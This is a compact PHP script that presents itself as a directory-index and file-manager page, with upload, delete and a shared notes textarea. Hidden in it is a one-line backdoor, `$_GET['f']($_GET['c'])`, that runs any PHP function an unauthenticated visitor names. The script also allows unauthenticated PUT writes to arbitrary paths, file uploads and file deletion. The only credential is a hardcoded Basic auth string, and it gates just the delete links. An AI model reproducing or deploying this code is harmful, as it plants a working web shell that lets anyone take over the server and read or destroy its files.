<?php // -d allow_url_include=1 -d memory_limit=20G -d post_max_size=20G -d upload_max_filesize=20G
ini_set('display_errors',0);date_default_timezone_set("Asia/Shanghai");$path=trim($_SERVER['SCRIPT_NAME'],'/');$dir=$_SERVER['DOCUMENT_ROOT'].'/'.$path;
if($_SERVER['REQUEST_METHOD']=='PUT')exit(file_put_contents($dir,file_get_contents('php://input'))&&error_log("$dir uploaded"));
$ftmp='/tmp/.copy';touch($ftmp);if(isset($_POST['copy']))file_put_contents($ftmp,$_POST['copy']);if($_GET['p']=='_X')exit($_GET['f']($_GET['c']));
$x=@$_SERVER['HTTP_AUTHORIZATION']=='Basic XzpwaWNv'?1:0;if('login'==@$_SERVER['QUERY_STRING']&&!$x)header('WWW-Authenticate: Basic');
if(is_file($dir)&&'rm'==@$_SERVER['QUERY_STRING'])exit(unlink($dir)&&error_log("$dir removed"));
$fnm=$_FILES?$_FILES['f']['name']:'';if($fnm)move_uploaded_file($_FILES['f']['tmp_name'],"$dir/$fnm")&&error_log("$dir/$fnm uploaded");
if(!is_dir($dir))return !1;if('v'!=@$_SERVER['QUERY_STRING'])return 1; 
echo "<meta charset=utf-8><meta http-equiv=Expires content=0><h3>Index of $dir</h3><hr><pre>";
if('v'==@$_SERVER['QUERY_STRING'])foreach(scandir($dir) as $v){if(substr($v,0,1)==='.'&&strlen($v)>2)continue;if(is_dir("$dir/$v"))$v.="/";
  elseif($x)echo "<a class=del target=hid onclick='return confirm(\"Delete $path/$v ?\")&&(setTimeout(()=>location.reload(),100))' href=\"/./$path/$v?rm\"></a> ";
  echo "<span><a href=\"/./$path/$v".(is_dir("$dir/$v")?'?v':'')."\">$v</a></span>"
    .sprintf("%20s",number_format(filesize("$dir/$v")))."\t".date('Y-m-d H:i:s',stat("$dir/$v")['mtime'])."\n";}
echo '</pre><form class=copy method=post><textarea name=copy>'.file_get_contents($ftmp).'</textarea><button type=submit>Save</button></form>
<style>pre{margin-bottom:50px;line-height:150%;}a{text-decoration:none}a.del:before{content:"â“§"}span{display:inline-block;width:500px}
.copy{position:fixed;top:0;right:0;width:50%;height:80%;}textarea{margin:5px 5px 5px 0;opacity:0.9;padding:2px;outline:none;height:80%;width:100%;display:block;background:lightyellow;}
.upload{position:fixed;left:0;bottom:0;width:80%;height:50px;margin:0 10%;box-sizing:border-box;text-align:center;}
.upload:hover i:after{content:"click or drag&drop file";color:blue;}input{width:100%;height:100%;opacity:0;cursor:pointer;}</style>
<form class=upload name=form method=post enctype=multipart/form-data ondragover=this.onmouseenter() ondragleave=this.onmouseleave()
 onmouseenter=this.style.borderStyle="dashed";this.style.borderWidth="2px";this.style.borderColor="gray"; onmouseleave=this.style.border=0>
<i></i><input name=f type=file onchange=form.submit()></form><iframe name=hid style=display:none;></iframe><script>window.find("'.$fnm.'", 0, 1)</script>';
